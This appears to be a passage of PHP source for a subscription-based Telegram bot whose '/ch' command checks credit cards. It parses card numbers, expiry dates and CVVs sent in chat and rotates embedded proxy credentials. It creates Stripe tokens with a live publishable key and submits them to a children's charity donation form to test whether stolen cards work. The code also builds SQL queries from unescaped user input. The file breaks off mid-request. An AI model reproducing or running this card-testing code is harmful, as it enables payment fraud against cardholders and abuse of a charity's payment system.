<?php
list($cmd) = explode(" ", $text);
if($cmd == "/ch" or $cmd == ".ch" or $cmd == "!ch" or $cmd == "?ch" or $cmd == "#ch" or $cmd == ":ch" or $cmd == ",ch"){ 

    // if($user_id !=5197853005){
    //     $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ Proxy Dead", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //     SendMessage($content);
    //     exit();
    // }
    if($cmd == '/ch'){
        $gatecmd = "ch";
    }elseif($cmd == ".ch"){
        $gatecmd = "ch";
    }elseif($cmd == "!ch"){
        $gatecmd = "ch";
    }elseif($cmd == "?ch"){
        $gatecmd = "ch";
    }elseif($cmd == "#ch"){
        $gatecmd = "ch";
    }elseif($cmd == ":ch"){
        $gatecmd = "ch";
    }elseif($cmd == ",ch"){
        $gatecmd = "ch";
    }
    $lista = explode(" ", $text)[1];
    $sql = "SELECT planexpiry FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("test.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $planexpiry = anicap($final2, '"planexpiry":"','"');
    mysqli_close(mysqlcon());
    
    $sql = "SELECT gatecmd FROM gateway WHERE gatecmd='$gatecmd'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("testt.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $gatec = anicap($final2, '"gatecmd":"','"');
    mysqli_close(mysqlcon());
    $sql = "SELECT status FROM gateway WHERE gatecmd='sb'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("testt.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $status = anicap($final2, '"status":"','"');
    mysqli_close(mysqlcon());
    if($status == "OFF"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ ", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }
    $sql = "SELECT plan FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    $plan = anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    
    $now = time();
    if($gatec != $gatecmd){
        $content = ['chat_id' => $chat_id, 'text' => "<b>Gate not added, 𝑷𝒍𝒆𝒂𝒔𝒆 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk </b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    // Check connection
    // Attempt create database query execution
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "<b>𝒀𝒐𝒖𝒓 𝒔𝒖𝒃𝒔𝒄𝒓𝒊𝒑𝒕𝒊𝒐𝒏 𝒑𝒍𝒂𝒏 𝒊𝒔 𝒆𝒙𝒑𝒊𝒓𝒆𝒅, 𝑷𝒍𝒆𝒂𝒔𝒆 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk 𝒕𝒐 𝒓𝒆𝒏𝒆𝒘</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    $SQL = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $chats =anicap($final2, '"chats":"','"');
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔𝒏'𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆, 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{
        
       
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $plan =anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆 𝒊𝒏 𝒑𝒓𝒊𝒗𝒂𝒕𝒆 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{}
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒂 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    } else {
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $text, $matches);
    if (count($matches[0]) == 3) {
        $cc = $matches[0][0];
        $mes = substr($matches[0][1], 0, 2);
        $ano = substr($matches[0][1], -2);
        $cvv = $matches[0][2];
    } else if (strlen($matches[0][1]) == 3) {
        $cc = $matches[0][0];
        $ano1 = $matches[0][2];
        $ano = $matches[0][3];
        $cvv = $matches[0][1];
        $mes = $ano1;
    } else {
        $cc = $matches[0][0];
        $mes = $matches[0][1];
        $ano = $matches[0][2];
        $cvv = $matches[0][3];
    }
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);
    if($first1 == "4"){
        $cc_type = "5963a708-fc7f-48af-952f-16d574c4b833";
    }
    if($first1 == "5"){
        $cc_type = "b34832f7-8a95-47fa-9c43-bc8682562ea5";
    }
    if($first1 == "3"){
        $cc_type = "c4a56513-9fdb-44c5-9b19-e617f2596107";
    }
    if($mes == "01"){
        $sub_mes = "1";
    }elseif($mes == "02"){
        $sub_mes = "2";
    }elseif($mes == "03"){
        $sub_mes = "3";
    }elseif($mes == "04"){
        $sub_mes = "4";
    }elseif($mes == "05"){
        $sub_mes = "5";
    }elseif($mes == "06"){
        $sub_mes = "6";
    }elseif($mes == "07"){
        $sub_mes = "7";
    }elseif($mes == "08"){
        $sub_mes = "8";
    }elseif($mes == "09"){
        $sub_mes = "9";
    }elseif($mes == "10"){
        $sub_mes = "10";
    }elseif($mes == "11"){
        $sub_mes = "11";
    }elseif($mes == "12"){
        $sub_mes = "12";
    }
    $cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, -8);
$cc3 = substr($cc, 8, -4);
$cc4 = substr($cc, -4);

    //        'ihojryep-rotate:a75v25f6afx1',
    //"psyohwld-rotate:hdxu4zfaz5ip",
    $rotate = array(
        'U99pbU:yM0wAf',
        'oCqNRH:i18i58',
        'PfO6EN:3j04W4',
        'oXGn5O:E3lj3G',
        'lr9wwO:x33pVi',
        '2jCHw9:KzDDgy',
        'UbFFce:3Ftrj2',
        'K5VKJa:8zdAZT',
        'f951hv:k0YRer',
        '1pYsMR:TonSB4',
        'A7t28n:XEDwsb',

        );
        
        $user_pass = $rotate[array_rand($rotate)];
    //         "AUTH"   => "unoehbda-rotate:2bxs8q2xfbks"
    $server = [
        "METHOD" => "CUSTOM",
        "SERVER" => "p.webshare.io:80",


        "AUTH"   => "rteavycr-rotate:f9o3l1ryizdq"
    ];
    

        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        $time = 30;
        $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < 30)
        {
            $TotalTime = $time - $TIMEAC;
            if($plan !== "Free User"){

            }elseif($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 : <code><i>$TotalTime</i></code>s\n══════════════════════</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }
    $banned_bins = ['485953', '650907', '515462', '489504', '534417', '483698', '403015', '435880', '522158', '515478', '440393', '472926', '498503', '542418', '559900', '540324', '484718', '423223', '510404', '546616', '459192', '510409', '539817', '429435', '426370', '521069', '549627', '437507', '542717', '520593', '494656', '529794', '457286', '428303', '476771', '531106', '494160', '411810', '409177', '481969', '536595', '557945', '485340', '530446', '511114', '559591', '549184', '414720', '546775', '414397', '437303', '424067', '540449', '475465', '524038', '435167', '511098', '499818', '537489', '547115', '414398', '512487', '420495', '430460', '521380', '425032', '530544', '491449', '522714', '567511', '154620', '432672', '537445', '526293', '403935', '533621', '401924', '402360', '489049', '533325', '402018', '405482', '535463', '533814', '529559', '538923', '535456', '531108', '541591', '481776', '403446', '540302', '533935', '498872', '540608', '472776', '533248', '484224', '446053', '410039', '601120', '442732', '377935', '543816', '601149', '372300', '529750', '415285', '415231', '473327', '408832', '514503', '523434', '450742', '518375', '485246', '537664', '554714', '533728', '525855', '410489', '522686', '412003', '443161', '440229', '459510', '539123', '519325', '531340', '530347', '516488', '436681', '559911', '457572', '464732', '546001', '468840', '453756', '525103', '601140', '545348', '533317', '411600', '537697', '511558', '467199', '464556', '424002', '557348', '442743', '530551', '403995', '483039', '483316', '416860', '521403', '405433', '539689', '526736', '481775', '515472', '511516', '442062', '526274', '444607', '539636', '451431', '533582', '438959', '402361', '445785', '512773', '453744', '539634', '511361', '440353', '455172', '529053', '520828', '404841', '473690', '478499', '539591', '416995', '526491', '422589', '419113', '469395', '548793', '515477', '402063', '527527', '527368', '549399', '554730', '467321', '533004', '526430', '441686', '428149', '493452', '523471', '453308', '428346', '428307', '416722', '529086', '454481', '414693', '411192', '413514', '516989', '513213', '400045', '481285', '519404', '519280', '540226', '511565', '527346', '441101', '539854', '530706', '559758', '517805', '511673', '527789', '511332', '530690', '542935', '529275', '511774', '524467', '452018', '403530', '469396', '511350', '511321', '404386', '473947', '485912', '409758', '517476', '527837', '535971', '515519', '400331', '493595', '511564', '527395', '445507', '536659', '432465', '522096', '439457', '400921', '453081', '522157', '404585', '538875', '516121', '522719', '534228', '544544', '491288', '511563', '528227', '453973', '544586', '403905', '516155', '537207', '411894', '408635', '522725', '539226', '526250', '441070', '424840', '515101', '512092', '529063', '489212', '511317', '457949', '533862', '527329', '515549', '410352', '407714', '400632', '451002', '537911', '530772', '428486', '511330', '519532', '546324', '516532', '533813', '548274', '516502', '510087', '557838', '513207', '530964', '514998', '534548', '516520', '516508', '542837', '533281', '511560', '527351', '529567', '448975', '531170', '515554', '533821', '535480', '544768', '423991', '538651', '533984', '532081', '425096', '538792', '511089', '530082', '537666', '539186', '527069', '539175', '548566', '544679', '485320', '451129', '517163', '420064', '533323', '494159', '526724', '537915', '484735', '527660', '401188', '432168', '512150', '533842', '511467', '513252', '532164', '401921', '479613', '468271', '401719', '402400', '401658', '400022', '475129', '416598', '548398', '506731', '563294', '459354', '549622', '416994', '639167', '475675', '472409', '415059', '432154', '445677', '419973', '455479', '427432', '510126', '529172', '529923', '428813', '532613', '454861', '540300', '540305', '540309', '540333', '540335', '540350', '540356', '540357', '540369', '540396', '544215', '554723', '554756', '627895', '376752', '357401', '372742', '375150', '422803', '459654', '530072', '466544', '468789', '514858', '422403', '473653',];
        // if($bin == "440393"){
        //     $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        //     $m1  = SendMessage($content);
        //     exit;
        // }else {
                
        // }
        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
        $timest = time();
        $SQL = "UPDATE ADMINISTRAR SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕...</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];
        

        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■□□□□</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
        $m2  = EditMessageText($content);
        $m2i = $m2['result']['message_id'];

        /*----------  R2 CAPTCHA  ----------*/
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■□□</b>", 'message_id' => $m2i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
        $m3i = $m3['result']['message_id'];
#-------------------- Bin -------------#
$cctwo = substr("$cc", 0, 6);
$curl = curl_init();
curl_setopt_array($curl, [
CURLOPT_URL => "https://bins-su-ani.vercel.app/api/".$bin,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_ENCODING => "",
CURLOPT_MAXREDIRS => 10,
CURLOPT_TIMEOUT => 30,
CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
CURLOPT_CUSTOMREQUEST => "GET",
CURLOPT_HTTPHEADER => [
"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
"sec-fetch-dest: document",
"sec-fetch-site: none",
"user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
],
]);

$result = curl_exec($curl);
curl_close($curl);
$data = json_decode($result, true);
$bank = $data['data']['bank'];
$country = $data['data']['country'];
$brand = $data['data']['vendor'];
$level = $data['data']['level'];
$type = $data['data']['type'];
$flag = $data['data']['countryInfo']['emoji'];
$result1 = $data['result'];


# ------------ Ramdom User ------------ #

$name = ucfirst(str_shuffle('anibhai'));
$last = ucfirst(str_shuffle('pemro'));
$email = "Dabilol".substr(md5(uniqid()), 0, 8)."@gmail.com";
$street = "".rand(0000,9999)." Main Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY"){
$state = "New York";
$zip = "10080";
$city = "New York";
}
elseif ($statee == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($statee == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($statee == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange Park";
}else{
$state = "California";
$zip = "90201";
$city = "Bell";
};

        /*----------  R2 STRIPE  ----------*/
$cookie = uniqid();
// hub-us-7.litport.net:31337:oCqNRH:i18i58
$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST,1);
$headers = array();
$headers[] = 'authority: api.stripe.com';
$headers[] = 'accept: application/json';
$headers[] = 'accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=jhon+ohio&card[address_line1]=214+East+Camelback+Road&card[address_city]=Phoenix&card[address_state]=AZ&card[address_zip]=85012&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=48ba8d28-1e3d-4a7e-b7c5-0a837da57cf98c4426&muid=105459f6-4da7-43b1-bd0c-8240e48bcd8221d5fd&sid=0fda6eff-b242-4c30-9d4d-600a7f5d7b2b0eac25&payment_user_agent=stripe.js%2F0627b2811%3B+stripe-js-v3%2F0627b2811&time_on_page=78781&key=pk_live_f6rtKChNzYS3H5Y5oO97RD7d');
$curl = curl_exec($ch);
curl_close($ch);
$token = getData($curl, '"id": "','"');

# ------------------------------------------------------------------------- [2 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "rteavycr-rotate:f9o3l1ryizdq");
curl_setopt($ch, CURLOPT_URL, 'https://donate.ticketsforkids.org/Default');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Host: donate.ticketsforkids.org';
$headers[] = 'Origin: https://donate.ticketsforkids.org';
$headers[] = 'Referer: https://donate.ticketsforkids.org/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '__VIEWSTATE=noS3qJKKzrg0VQUGmRsGYWZ%2BljDH4S%2FD%2Fa9UE0WgjL4KcQOnKFm%2BqGametmciBSxELGxFgU0Tn4VIFqgwSpiahj46Lb0RQqhA4pfrCt3WAs3Fy7nF45P6te7sckISgDIJX%2BTGPCvJcafr99DnrKRyGJqwEMysX7u6p2fvvwwJBovupHMJH5CyH7zILcfCCLQK2Q3qlqGMDe4YkaK9m52vI3mAQFb7ircWVjz4rfkq78RTvxCqFJZBI%2FjM2pVJKQVUJIjhAam%2FOAks%2FK1vSLhW6nJff6JC6HJWckg4v4hXJFlPDY%2F6IP5QOibBXlGDoQ9Vy%2FETw%2BgwRC7MDq3blffypnchUn3EaFSIUiKv4eCOSeY7RUsebzVGuVS8XBYpFPYuUilEdZ9sfbn0cCylw8ZgLicLsBbaegyDpWnzTLF2LAHaWVthVpZWKIAFA0xEyDef9RVR7ygXwKDWl52URHy7doov3s9WHLZGcla0y5XAhapou4yghOMNo%2BSa8TQZSayIPMxMNrC6gBV0ek6oQtCvXjSjo1OrxFPjBD99PRD%2F2W9AmWbf7wKUEKaTrOcynxYAVrvGZM%2FqAfo8GaVcMkReilxq6v%2FKf8VlMxKOT%2Fwa2h58vzg5yjof%2FqBpn1H3ZJCtKntTbAOkGVkEUn6tbcsfym%2BhD8DmgxY4UUJOZPmKoRXMLLXMs7Ni%2FPh4VuxNNKOZKiCwR8zAc3ii2TKavbvrZ6aKU2tce0hwaXNCejGqSXlJvjUv%2FAlOtSE9n34qXMDyUnPNGThCNDJofEQpbz1w4%2FsOjG11vG9rp9BY6xB572ByjmVNEs1IiR2qoeowVm%2FQqgY3fE9dnh8A0eMH%2FNhmab6HtNIHn9xk8J8VNuf4Jesi3uA3jMfnNf%2Brwql3hs1vz2cNia%2FytLlr%2By1TnqrHrISIhcEyMIxuIQNKH72dfCQcPzzR2kye91PDkikdZO8vnHKZHskE2aIr0nxhMUF6wEXbb7%2FLuYFTeRJ79%2F0t%2BUvZ5c8cnTx2C%2FAPvhlJXQBYvA2fL%2FGcEN1oW3yegGy%2BS2EjYaCHuE2DBoLNYncSUdV6pULrwNkfw4IK2aCa1GKi0TeJol%2BpJKcLSUaBUAR%2BkTUF%2Bt4XUghSU9XGSMxA8uZc6j2c1GTv%2Bu31skI%2Bq9ta0rgUthLh%2Fd75hP3aC1idPyDWbM4poZrHpxq06C7crPUa0okJ33bY1UV1rbbNLhrPtEMPxHTASM6mMcD66vCVwcv%2Fc%2BcbTMIh85QEmhpgBVmeSJiJH9zV05PLqFso8J2S%2Bhz5oT6mswBoMarJ9wcd0wzKloeYzUZMxNLI727OE7Nxp7fEXifTSlO%2FgklZ0Eqva1f25LYPsRwI2aDif8JJXBsBmylju%2FWbQVBf8qq7zug8da0hOh3wh0uqTPwaQWw9aVRI2jUWiOI9t46Wmi6c7UXamFiQKMAk36qqfcF7MuwEDRuoMuanQXFBniDUPIBIkrzoLdtkMuli3v4B8g%2BWlrujI3pMuJPoryA9ajGcSl8oXshXo3esS3lcAY3T2yfAsE4IShtyUREnKJ1BMbvZvnrbshOsF1ex9%2BxZutXKxOdISqfSU8V%2BVUW%2BUtNRLalnTpXw0vfh8YzHzHw9H5A9gyZZH5Ie%2B1t6ySWqdkBfr15fYAw%2FRVIN9mM7a4Vb4qcopXIHVDioXHuLjwmWkbniemeVYlJw8ENs%2BrOfyrPLbQpkNDZ28Hv%2Bek31qFH6WdCjd6kLg5qe%2Fg1%2BQKH%2FVCGHWqCcNpIiWR3%2FGlahEnH8jCdgI01KdmIMxOzkGdU5duNlR1M%2BqkprKjYPDK%2F5YKoWLFOCQ7tT4hj17pxAR9dbMsmFRyqx3gEEbjmOfZN8WMyKhqh1BV3khR%2BVh78CbYRGCPRSexn9HSfEYdf%2FTtBMGI7OriXkVVR64YPzN8C9xswzb%2FrmFnj%2F6a661DR1jT4l2%2BSAKkhvUduWsGhNrQSxBJ9O84OJxaX0ysrKiN07CxLd25Aa6KMa%2FoQvIPrWHKYDj4ZCdMk7MK1pWPnI9ah%2F17ubEhWmxe%2FiLG%2FeYeW4LLVBQwt0GxPSnGYxaSWwTQRX%2FwWz1f1%2FxibxCsyjbtLJc%2FURgr8xfR8vxSPoR3IjuImkDKhLtysmQSBOtmjIEscf25i7OY4EV3aDq3d1WWltB40umSIfkW%2FSqKMJyK6kgjGgEXuZoeimLlDiq3mS0zHtCXrcFpMAPB3DjwecdyMoNsPxy%2Fcyfa6ozOP4m2f%2FYfmT2EmL8JGj9GmgouaomOgYUqdSf0zuvEmVMOZI4mwGTslkLJj0HNZ4R%2BEsfqsYfbm0FHhqE3tBnBg6MI0vpdN7nPELkGoWTs75cZQBsPSbc5vi06nQ0RwB%2Bvn%2B4wl6ZlAYtQO1syUAHH0MoF4VFfh6KloHgKk0ra2%2BZijHJnx4ko5n0bTSnIVdq9QYpaGqvNjYa7T41sE1W1izydWVIDNZpkH9aVD1zIMoxUzSjAMXUynUWsYV%2FVsOdmCmkxh6U961HYloRZC6qDttYC4Nwgyu6qaEb9J4y0%2FcFyV3Cpdy9gXZZTF0Cs%2Fn38rAuURuw%2F7czZAhINYKg57XfEtqYnf3PnWUsTMX1yZPRibC9vBLYN67xQ56tKpJDW2a8bXaylxmm3Pe%2Fgf3BQ9cM0O81HfwrJJzQ%2FozwVx38diiBLe4DqXKTIcrvwmBw76IXVUxpMt9%2BQ8TMNfGHW8t2WKKoiFcAJIddtxPoY4X9vCJ5C0krk5IJcOwVCC5CCV4XCBI6N%2BNjX4HQAUDaqFQfLZaqcuqjQWThJymvAIH7%2FK1k%2F7KWR%2Ba6CwXb%2Bdu5vaQwHx5kn18EZz9U4flrwDmkQca9%2F0A9UcZAou2cMjK8uobzTUbXzSLlVJPQiA0fmRExSahqwlTZ3ezurS387qZj8hFtsdm9pFgCZ8Lrf%2FX3IA%2F5gXGxAV06ivtMU7LkI6ZTBhqioaWFoVhsOQdRL1YyfHu1pnOQTyzckqX%2B7ZfAvkKkHk8E47WqhvCvQV0VyYyshZ1us7JqMx643ckG%2F5WU6U